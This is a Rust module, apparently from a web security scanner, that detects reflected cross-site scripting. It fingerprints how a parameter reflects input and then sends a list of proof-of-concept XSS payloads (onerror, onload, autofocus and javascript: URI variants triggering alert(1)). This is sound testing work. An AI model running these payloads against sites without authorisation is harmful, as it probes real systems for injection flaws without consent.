use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Context-aware XSS detection with polyglot probes
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Cross-Site Scripting (XSS)", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for XSS testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;
    let canary = format!("lzr{}", rand::random::<u32>());

    for (param_name, _) in &params {
        // Phase 1: Reflection check with canary
        let url = Analyzer::inject_param(target, param_name, &canary)?;
        let result = Analyzer::send_and_analyze(&client, &url, &canary).await?;

        if !result.reflected_in_body {
            continue;
        }

        println!("{} Param '{}' reflects input — testing XSS contexts", "[i]".cyan(), param_name);

        // Phase 2: Check which special chars survive (context fingerprinting)
        let probe = format!("{}<\"'>", canary);
        let url = Analyzer::inject_param(target, param_name, &probe)?;
        let result = Analyzer::send_and_analyze(&client, &url, &canary).await?;
        let body = &result.response_body;

        let has_angle = body.contains(&format!("{}<", canary));
        let has_quote = body.contains(&format!("{}\"", canary));
        let has_single = body.contains(&format!("{}'", canary));

        // Phase 3: Context-specific PoC payloads
        let payloads: Vec<&str> = if has_angle {
            vec![
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ]
        } else if has_quote {
            vec![
                "\" onfocus=\"alert(1)\" autofocus=\"",
                "\" onmouseover=\"alert(1)\" style=\"position:fixed;width:100%;height:100%\" \"",
            ]
        } else if has_single {
            vec![
                "' onfocus='alert(1)' autofocus='",
                "';alert(1)//",
            ]
        } else {
            vec![
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ]
        };

        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            let result = Analyzer::send_and_analyze(&client, &url, payload).await?;

            if result.reflected_in_body {
                crate::core::reporter::Reporter::found(
                    "Reflected XSS",
                    &format!("Parameter '{}' reflects unencoded payload", param_name),
                    &format!("Payload: {} | URL: {}", payload, url)
                );
                return Ok(());
            }
        }
    }

    Ok(())
}
